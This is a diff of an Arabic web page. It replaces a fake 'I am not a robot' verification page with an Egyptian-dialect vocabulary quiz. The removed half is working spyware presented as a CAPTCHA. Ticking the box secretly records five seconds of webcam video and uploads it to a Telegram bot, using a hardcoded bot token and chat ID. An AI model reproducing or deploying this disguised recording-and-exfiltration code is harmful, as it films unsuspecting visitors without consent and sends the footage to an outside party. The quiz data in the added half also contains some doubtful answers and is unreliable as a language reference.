@@ -1,185 +1,174 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اختبار التحقق</title>
+    <title>اختبار اللهجات المصرية</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: linear-gradient(135deg, #1E88E5, #43A047);
-            color: white;
-            overflow: hidden;
-        }
-
-        .container {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            color: #333;
             text-align: center;
-            background: rgba(0, 0, 0, 0.8);
             padding: 20px;
-            border-radius: 20px;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
-
         h1 {
-            font-size: 20px;
-            margin-bottom: 15px;
+            color: #555;
         }
-
-        .checkbox-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 15px 0;
-            gap: 10px;
+        select, button {
+            padding: 10px;
             font-size: 16px;
-            cursor: pointer;
+            margin: 10px;
         }
-
-        input[type="checkbox"] {
-            width: 20px;
-            height: 20px;
-            accent-color: #4CAF50;
-            transition: transform 0.3s ease;
-        }
-
-        input[type="checkbox"]:checked {
-            transform: scale(1.2);
-        }
-
-        .loading {
+        .questions-container {
             display: none;
-            font-size: 16px;
-            margin-top: 15px;
-            color: #FBC02D;
+            margin-top: 20px;
         }
-
-        .success {
-            display: none;
-            font-size: 16px;
-            margin-top: 15px;
-            color: #4CAF50;
-        }
-
-        video {
-            display: none;
-            width: 100%;
-            max-width: 300px;
-            height: auto;
-            margin: 15px 0;
-            border-radius: 10px;
-            background: black;
-        }
-
-        .question-section {
-            display: none;
-            text-align: right;
-        }
-
         .question {
+            background-color: #fff;
             margin: 10px 0;
-            font-size: 16px;
+            padding: 10px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
-
-        button {
-            background: #4CAF50;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
+        .options {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .option {
+            margin: 5px 0;
             cursor: pointer;
-            font-size: 14px;
         }
-
-        button:hover {
-            background: #45A049;
+        .option:hover {
+            background-color: #efefef;
+        }
+        .result {
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>تحقق من أنك لست روبوتاً</h1>
-        <div class="checkbox-container">
-            <input type="checkbox" id="robot-checkbox">
-            <label for="robot-checkbox">أنا لست روبوتاً</label>
-        </div>
-        <video id="video" autoplay playsinline muted></video>
-        <div class="loading">جاري التسجيل... ⏳</div>
-        <div class="success">✅ تم التحقق بنجاح!</div>
-        <div class="question-section" id="question-section">
-            <h2>اختبار اللغة الفلاحية</h2>
-            <div class="question">1. ما هي الكلمة الفلاحية لـ "الطماطم"؟</div>
-            <button>إرسال</button>
-        </div>
+
+    <h1>اختبر معرفتك باللهجات المصرية</h1>
+
+    <label for="dialectSelect">اختر اللهجة:</label>
+    <select id="dialectSelect">
+        <option value="اسكندراني">اسكندراني</option>
+        <option value="منياوي">منياوي</option>
+        <option value="فلاحي">فلاحي</option>
+        <option value="صعيدي">صعيدي</option>
+    </select>
+
+    <button id="startTestButton">ابدأ الاختبار</button>
+
+    <div class="questions-container" id="questionsContainer">
+        <div id="questions"></div>
+        <button id="submitTestButton">إرسال الإجابات</button>
     </div>
 
+    <div class="result" id="result"></div>
+
     <script>
-        const video = document.getElementById('video');
-        const checkbox = document.getElementById('robot-checkbox');
-        const loading = document.querySelector('.loading');
-        const success = document.querySelector('.success');
-        const questionSection = document.getElementById('question-section');
+        const dialects = {
+            "اسكندراني": [
+                { q: "ما معنى كلمة 'جعان'؟", options: ["محتاج", "جائع", "نعسان", "غاضب"], correct: 1 },
+                { q: "ماذا تعني 'حتة'؟", options: ["جزء", "بيت", "مكان", "شيء"], correct: 0 },
+                { q: "ما معنى 'كنبة'؟", options: ["كرسي", "أريكة", "طاولة", "خزانة"], correct: 1 },
+                { q: "ما هو 'كشك'؟", options: ["متجر صغير", "مقهى", "مطعم", "سيارة"], correct: 0 },
+                { q: "ماذا تعني 'أبو'؟", options: ["أب", "عم", "خال", "صديق"], correct: 0 },
+                { q: "ما معنى 'يخلي بالك'؟", options: ["يحذر", "يُهمل", "يساعد", "يدير"], correct: 0 },
+                { q: "ماذا تعني كلمة 'تاكسي'؟", options: ["سيارة أجرة", "دراجة", "حافلة", "قطار"], correct: 0 },
+                { q: "ما معنى 'تكدب'؟", options: ["تسخر", "تتحدث بصدق", "تقول كذبًا", "تساعد"], correct: 2 },
+                { q: "ماذا تعني 'عيش'؟", options: ["خبز", "طعام", "شراب", "مال"], correct: 0 },
+                { q: "ما معنى 'عيني'؟", options: ["عين", "هدية", "محل", "رفيق"], correct: 0 },
+                // Add more questions...
+            ],
+            "منياوي": [
+                { q: "ماذا تعني 'أبا'؟", options: ["أنا", "أبي", "أنت", "نعم"], correct: 1 },
+                { q: "ما هو معنى 'زير'؟", options: ["وعاء ماء", "ثوب", "طعام", "بيت"], correct: 0 },
+                { q: "ماذا تعني 'جرادل'؟", options: ["دلاء", "أكواب", "ملاعق", "شوك"], correct: 0 },
+                { q: "ما معنى 'مغترب'؟", options: ["مسافر", "مهاجر", "مقيم", "شخص عاطل"], correct: 1 },
+                { q: "ماذا تعني كلمة 'شنطة'؟", options: ["حقيبة", "سلة", "صندوق", "كرسي"], correct: 0 },
+                { q: "ما معنى 'مغسل'؟", options: ["غسيل", "مطبخ", "مغسلة", "مستشفى"], correct: 2 },
+                { q: "ماذا تعني كلمة 'كلب'؟", options: ["قطة", "كلب", "حصان", "دجاجة"], correct: 1 },
+                // Add more questions...
+            ],
+            "فلاحي": [
+                { q: "ماذا يعني 'المندل'؟", options: ["عصا", "شمعة", "بيت", "ساحة"], correct: 0 },
+                { q: "ما هو 'الوابور'؟", options: ["قطار", "عربة", "سيارة", "موقد"], correct: 3 },
+                { q: "ماذا تعني 'فراح'؟", options: ["مناسبة", "بيت", "دجاجة", "حفل"], correct: 3 },
+                { q: "ما معنى 'ياولد'؟", options: ["ابن", "صديق", "طفل", "جيران"], correct: 2 },
+                // Add more questions...
+            ],
+            "صعيدي": [
+                { q: "ما معنى 'عالبركة'؟", options: ["على الرحب", "موافق", "على مهل", "على الله"], correct: 3 },
+                { q: "ماذا تعني 'الكراكة'؟", options: ["محراث", "عربة", "مجرفة", "قارب"], correct: 2 },
+                { q: "ما هو 'الهوا'؟", options: ["ريح", "شمس", "مطر", "زهر"], correct: 0 },
+                // Add more questions...
+            ]
+        };
 
-        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
-        const telegramChatId = "2070423407";
+        let selectedDialect = '';
+        let currentQuestionIndex = 0;
+        let userAnswers = [];
 
-        checkbox.addEventListener('change', (e) => {
-            if (e.target.checked) {
-                video.style.display = 'block';
-                loading.style.display = 'block';
-                success.style.display = 'none';
+        document.getElementById('startTestButton').addEventListener('click', startTest);
+        document.getElementById('submitTestButton').addEventListener('click', submitTest);
 
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then((stream) => {
-                        video.srcObject = stream;
-                        const mediaRecorder = new MediaRecorder(stream);
-                        const chunks = [];
+        function startTest() {
+            selectedDialect = document.getElementById('dialectSelect').value;
+            currentQuestionIndex = 0;
+            userAnswers = [];
+            document.getElementById('questionsContainer').style.display = 'block';
+            loadQuestion();
+        }
 
-                        mediaRecorder.start();
+        function loadQuestion() {
+            const questions = dialects[selectedDialect];
+            const question = questions[currentQuestionIndex];
 
-                        mediaRecorder.ondataavailable = (event) => {
-                            chunks.push(event.data);
-                        };
+            const questionContainer = document.createElement('div');
+            questionContainer.classList.add('question');
 
-                        setTimeout(() => {
-                            mediaRecorder.stop();
-                        }, 5000); // Record for 5 seconds
+            const questionText = document.createElement('p');
+            questionText.textContent = question.q;
+            questionContainer.appendChild(questionText);
 
-                        mediaRecorder.onstop = () => {
-                            loading.style.display = 'none';
-                            success.style.display = 'block';
-                            stream.getTracks().forEach(track => track.stop());
+            const optionsContainer = document.createElement('div');
+            optionsContainer.classList.add('options');
+            question.options.forEach((option, index) => {
+                const optionDiv = document.createElement('div');
+                optionDiv.classList.add('option');
+                optionDiv.textContent = option;
+                optionDiv.onclick = () => handleAnswer(index);
+                optionsContainer.appendChild(optionDiv);
+            });
 
-                            const blob = new Blob(chunks, { type: 'video/webm' });
-                            const formData = new FormData();
-                            formData.append('chat_id', telegramChatId);
-                            formData.append('video', blob);
+            questionContainer.appendChild(optionsContainer);
+            document.getElementById('questions').appendChild(questionContainer);
+        }
 
-                            fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
-                                method: 'POST',
-                                body: formData
-                            })
-                                .then(response => response.json())
-                                .then(data => {
-                                    console.log('Video sent to Telegram:', data);
-                                    questionSection.style.display = 'block';
-                                })
-                                .catch(error => {
-                                    console.error('Error sending video:', error);
-                                });
-                        };
-                    })
-                    .catch((err) => {
-                        alert("Unable to access the camera: " + err.message);
-                    });
+        function handleAnswer(selectedOptionIndex) {
+            userAnswers[currentQuestionIndex] = selectedOptionIndex;
+            currentQuestionIndex++;
+            if (currentQuestionIndex < dialects[selectedDialect].length) {
+                document.getElementById('questions').innerHTML = ''; // Clear previous question
+                loadQuestion();
             }
-        });
+        }
+
+        function submitTest() {
+            const questions = dialects[selectedDialect];
+            let score = 0;
+            userAnswers.forEach((answer, index) => {
+                if (answer === questions[index].correct) {
+                    score++;
+                }
+            });
+            document.getElementById('result').textContent = `نتيجتك: ${score} من ${questions.length}`;
+        }
     </script>
+
 </body>
 </html>
